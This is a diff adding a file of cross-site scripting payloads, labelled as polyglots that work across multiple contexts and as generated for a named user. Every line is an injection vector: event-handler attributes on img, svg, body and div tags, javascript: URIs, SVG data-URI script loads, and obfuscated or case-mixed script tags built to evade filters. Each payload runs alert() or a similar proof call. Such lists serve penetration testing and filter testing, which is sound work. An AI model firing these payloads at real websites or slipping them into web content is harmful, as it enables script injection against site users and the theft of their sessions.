@@ -1,0 +1,39 @@
+# XSS Polyglot Payloads - works across multiple contexts
+# generated for Lyussfyuring002
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+'">><img src=xxx:x onerror=javascript:alert(1)>
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+`;alert(1);//
+\x3cscript\x3ealert(1)\x3c/script\x3e
+<script>/* </script> */alert(1)//
+<!--<img src="--><img src=x onerror=alert(1)//">
+<image/src/onerror=alert(1)>
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<body src=1 href=1 onerror="javascript:alert(1)"></body>
+<image src=1 href=1 onerror="javascript:alert(1)"></image>
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+<script src=1 href=1 onerror="javascript:alert(1)"></script>
+<svg><script href=data:,alert(1) />
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x" />
+<a href="[javascript:alert(1)]">click</a>
+<a href=" javascript:alert(1)">click</a>
+<a href="	javascript:alert(1)">click</a>
+<math href="javascript:alert(1)">click</math>
+<table><td background="javascript:alert(1)">
+<object classid=aa.b onload=alert(1)>
+<applet onReadyStateChange=alert(1)></applet>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)><a href=#x>clickme
+<body onresize=alert(1)>
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<div style=-webkit-animation-name:x onwebkitAnimationStart=alert(1)>
+<div style=animation-name:x onanimationstart=alert(1)>
+<div style=-webkit-animation-name:x onwebkitAnimationEnd=alert(1)>
+<div style=animation-name:x onanimationend=alert(1)>
+<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=alert(1)>
